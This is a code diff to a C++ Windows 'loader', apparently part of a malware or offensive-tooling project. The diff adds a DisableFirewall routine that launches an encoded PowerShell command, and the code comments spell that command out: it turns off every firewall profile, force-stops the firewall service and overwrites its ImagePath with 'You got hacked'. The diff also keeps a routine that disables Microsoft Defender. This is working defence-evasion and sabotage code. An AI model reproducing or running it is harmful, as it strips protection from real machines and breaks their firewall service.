@@ -4,10 +4,20 @@ std::string componentName = "loader";
 
 int wmain() {
 	Log("[+] Starting " + componentName + ".", componentName);
-	Log("[*] Running as " + RunWhoami(), componentName);
+	Log("[*] Running as " + GetUserAndContext(), componentName);
 
 	if (DisableDefender() != 0) {
-		// disabling defender failed
+		Log("[!] Error disabling defender", componentName);
+	}
+	else {
+		Log("[*] Successfully disabled defender", componentName);
+	}
+
+	if (DisableFirewall() != 0) {
+		Log("[!] Error disabling firewall", componentName);
+	}
+	else {
+		Log("[*] Successfully disabled firewall", componentName);
 	}
 
 	// TODO: create working directory
@@ -26,56 +36,6 @@ int wmain() {
 }
 
 int DisableDefender() {
-	//std::map<LPCSTR, std::map<LPCSTR, DWORD>>::iterator outer;
-	//std::map<LPCSTR, DWORD>::iterator inner;
-
-	//for (outer = registryEntries.begin(); outer != registryEntries.end(); outer++) {
-	//	for (inner = outer->second.begin(); inner != outer->second.end(); inner++) {
-
-	//		LSTATUS s;
-	//		HKEY key;
-
-	//		s = RegCreateKeyExA(
-	//			HKLM,
-	//			outer->first,
-	//			0,
-	//			NULL,
-	//			REG_OPTION_NON_VOLATILE,
-	//			KEY_WRITE,
-	//			NULL,
-	//			&key,
-	//			NULL
-	//		);
-	//		//s = RegOpenKeyExA(
-	//		//	HKLM,
-	//		//	outer->first,
-	//		//	0,
-	//		//	KEY_WRITE,
-	//		//	&key
-	//		//);
-	//		if (s != ERROR_SUCCESS) {
-	//			Log("[!] Opening key failed " + std::string(outer->first) + " " + std::string(inner->first) + ": " + std::to_string(GetLastError()), componentName);
-	//		}
-	//		else {
-	//			Log("[*] Opened key " + std::string(outer->first) + " " + std::string(inner->first), componentName);
-	//		}
-
-	//		s = RegSetValueExA(
-	//			key,
-	//			inner->first,
-	//			0,
-	//			REG_DWORD,
-	//			reinterpret_cast<BYTE *>(inner->second),
-	//			sizeof(DWORD)
-	//		);
-	//		if (s != ERROR_SUCCESS) {
-	//			Log("[!] Writing key failed " + std::string(outer->first) + " " + std::string(inner->first) + ": " + std::to_string(GetLastError()), componentName);
-	//		}
-	//		else {
-	//			Log("[+] Wrote key " + std::string(outer->first) + " " + std::string(inner->first), componentName);
-	//		}
-	//	}
-	//}
 
 	Log("[*] Disabling defender thru registry.", componentName);
 	std::string retStr = "";
@@ -199,6 +159,109 @@ int DisableDefender() {
 	retStr = std::string(chBuf);
 
 	Log("[*] Output from DisableDefender powershell process: " + retStr, componentName);
+
+	return 0;
+}
+
+int DisableFirewall() {
+
+	Log("[*] Disabling firewall thru registry.", componentName);
+	std::string retStr = "";
+
+	// source: https://learn.microsoft.com/en-us/windows/win32/procthread/creating-a-child-process-with-redirected-input-and-output
+	HANDLE g_hChildStd_IN_Rd = NULL;
+	HANDLE g_hChildStd_IN_Wr = NULL;
+	HANDLE g_hChildStd_OUT_Rd = NULL;
+	HANDLE g_hChildStd_OUT_Wr = NULL;
+	std::unique_ptr<void, decltype(&CloseHandle)> uphg_hChildStd_IN_Rd(static_cast<void*>(g_hChildStd_IN_Rd), CloseHandle);
+	std::unique_ptr<void, decltype(&CloseHandle)> uphg_hChildStd_IN_Wr(static_cast<void*>(g_hChildStd_IN_Wr), CloseHandle);
+	std::unique_ptr<void, decltype(&CloseHandle)> uphg_hChildStd_OUT_Rd(static_cast<void*>(g_hChildStd_OUT_Rd), CloseHandle);
+	std::unique_ptr<void, decltype(&CloseHandle)> uphg_hChildStd_OUT_Wr(static_cast<void*>(g_hChildStd_OUT_Wr), CloseHandle);
+
+	SECURITY_ATTRIBUTES saAttr;
+	saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
+	saAttr.bInheritHandle = TRUE;
+	saAttr.lpSecurityDescriptor = NULL;
+
+	if (!CreatePipe(&g_hChildStd_OUT_Rd, &g_hChildStd_OUT_Wr, &saAttr, 0)) {
+		Log("[!] DisableFirewall StdoutRd CreatePipe: " + std::to_string(GetLastError()), componentName);
+		return 1;
+	}
+
+	if (!SetHandleInformation(g_hChildStd_OUT_Rd, HANDLE_FLAG_INHERIT, 0)) {
+		Log("[!] DisableFirewall Stdout SetHandleInformation: " + std::to_string(GetLastError()), componentName);\
+			return 2;
+	}
+
+	if (!CreatePipe(&g_hChildStd_IN_Rd, &g_hChildStd_IN_Wr, &saAttr, 0)) {
+		Log("[!] DisableFirewall Stdin CreatePipe: " + std::to_string(GetLastError()), componentName);
+		return 3;
+	}
+
+	if (!SetHandleInformation(g_hChildStd_IN_Wr, HANDLE_FLAG_INHERIT, 0)) {
+		Log("[!] DisableFirewall Stdin SetHandleInformation: " + std::to_string(GetLastError()), componentName);
+		return 4;
+	}
+
+	PROCESS_INFORMATION piProcInfo;
+	STARTUPINFOA siStartInfo;
+	BOOL bSuccess = FALSE;
+
+	ZeroMemory(&piProcInfo, sizeof(PROCESS_INFORMATION));
+	ZeroMemory(&siStartInfo, sizeof(STARTUPINFO));
+	siStartInfo.cb = sizeof(STARTUPINFO);
+	siStartInfo.hStdError = g_hChildStd_OUT_Wr;
+	siStartInfo.hStdOutput = g_hChildStd_OUT_Wr;
+	siStartInfo.hStdInput = g_hChildStd_IN_Rd;
+	siStartInfo.dwFlags |= STARTF_USESTDHANDLES;
+
+	std::unique_ptr<void, decltype(&CloseHandle)> uphProcess(static_cast<void*>(piProcInfo.hProcess), CloseHandle);
+	std::unique_ptr<void, decltype(&CloseHandle)> uphThread(static_cast<void*>(piProcInfo.hThread), CloseHandle);
+
+	// Set-NetFirewallProfile -Profile Domain, Public, Private -Enabled False;
+	// Stop-Service -Name 'mpssvc' -Force;
+	// Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Services\mpssvc' -Name 'ImagePath' -Value 'You got hacked' -Type ExpandString -Force -ErrorAction Continue;
+
+
+	std::string cmd = "powershell.exe -encodedCommand UwBlAHQALQBOAGUAdABGAGkAcgBlAHcAYQBsAGwAUAByAG8AZgBpAGwAZQAgAC0AUAByAG8AZgBpAGwAZQAgAEQAbwBtAGEAaQBuACwAIABQAHUAYgBsAGkAYwAsACAAUAByAGkAdgBhAHQAZQAgAC0ARQBuAGEAYgBsAGUAZAAgAEYAYQBsAHMAZQA7ACAAUwB0AG8AcAAtAFMAZQByAHYAaQBjAGUAIAAtAE4AYQBtAGUAIAAnAG0AcABzAHMAdgBjACcAIAAtAEYAbwByAGMAZQA7ACAAUwBlAHQALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQAgAC0AUABhAHQAaAAgACcASABLAEwATQA6AFwAUwBZAFMAVABFAE0AXABDAHUAcgByAGUAbgB0AEMAbwBuAHQAcgBvAGwAUwBlAHQAXABTAGUAcgB2AGkAYwBlAHMAXABtAHAAcwBzAHYAYwAnACAALQBOAGEAbQBlACAAJwBJAG0AYQBnAGUAUABhAHQAaAAnACAALQBWAGEAbAB1AGUAIAAnAFkAbwB1ACAAZwBvAHQAIABoAGEAYwBrAGUAZAAnACAALQBUAHkAcABlACAARQB4AHAAYQBuAGQAUwB0AHIAaQBuAGcAIAAtAEYAbwByAGMAZQAgAC0ARQByAHIAbwByAEEAYwB0AGkAbwBuACAAQwBvAG4AdABpAG4AdQBlADsA";
+
+	if (!CreateProcessA(
+		NULL,
+		const_cast<LPSTR>(cmd.c_str()),
+		NULL,
+		NULL,
+		TRUE,
+		0,
+		NULL,
+		NULL,
+		&siStartInfo,
+		&piProcInfo
+	)) {
+		Log("[!] Failed to create DisableFirewall powershell process." + std::to_string(GetLastError()), componentName);
+		return 5;
+	}
+	else {
+		CloseHandle(piProcInfo.hProcess);
+		CloseHandle(piProcInfo.hThread);
+		CloseHandle(g_hChildStd_OUT_Wr);
+		CloseHandle(g_hChildStd_IN_Rd);
+		Log("[+] Successfully created DisableFirewall powershell process.", componentName);
+	}
+
+	Sleep(500);
+
+	DWORD dwRead, dwWritten;
+	CHAR chBuf[4096];
+
+	for (;;)
+	{
+		bSuccess = ReadFile(g_hChildStd_OUT_Rd, chBuf, 4096, &dwRead, NULL);
+		if (!bSuccess || dwRead == 0) break;
+	}
+
+	retStr = std::string(chBuf);
+
+	Log("[*] Output from DisableFirewall powershell process: " + retStr, componentName);
 
 	return 0;
 }
